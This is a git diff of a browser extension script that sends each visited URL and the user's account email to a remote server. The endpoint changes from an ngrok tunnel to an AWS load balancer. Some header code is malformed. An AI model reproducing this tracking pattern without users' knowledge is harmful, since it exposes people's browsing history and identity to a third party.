@@ -22,10 +22,21 @@ chrome.identity.getAuthToken({'interactive': true}, function (token) {
 });
 
 chrome.history.onVisited.addListener(function(result) {
-    var response = fetch("https://184c-99-251-125-166.ngrok.io/history", {
+    var data = {
+        "url" : result.url,
+        "email": email,
+    }
+
+    let headers = new Headers();
+    headers.append('Content-Type', 'application/json');
+    headers.append('Accept', 'application/json');
+    headers.append('Access-Control-Allow-Origin', '*');
+    headers.append('GET', 'POST', 'OPTIONS');
+    var response = fetch("https://EC2Co-EcsEl-13VVDBYDJCR4H-496411098.us-east-1.elb.amazonaws.com/website", {
         method: 'POST',
-        body: "url: " + result.url + ", " + "email: " + email,
+        body: JSON.stringify(data),
         mode: 'no-cors',
+        headers: headers
     })
     response
         .then(value => {console.log(value)})
